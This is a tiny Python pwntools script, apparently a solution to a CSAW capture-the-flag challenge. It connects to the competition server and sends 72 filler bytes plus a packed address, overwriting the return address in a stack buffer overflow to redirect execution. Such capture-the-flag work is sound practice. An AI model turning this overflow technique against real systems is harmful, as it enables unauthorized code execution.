from pwn import *

r = remote('pwn.chal.csaw.io', 8000)
r.sendline('A'*72 + p64(0x40060d))
print r.recvall()
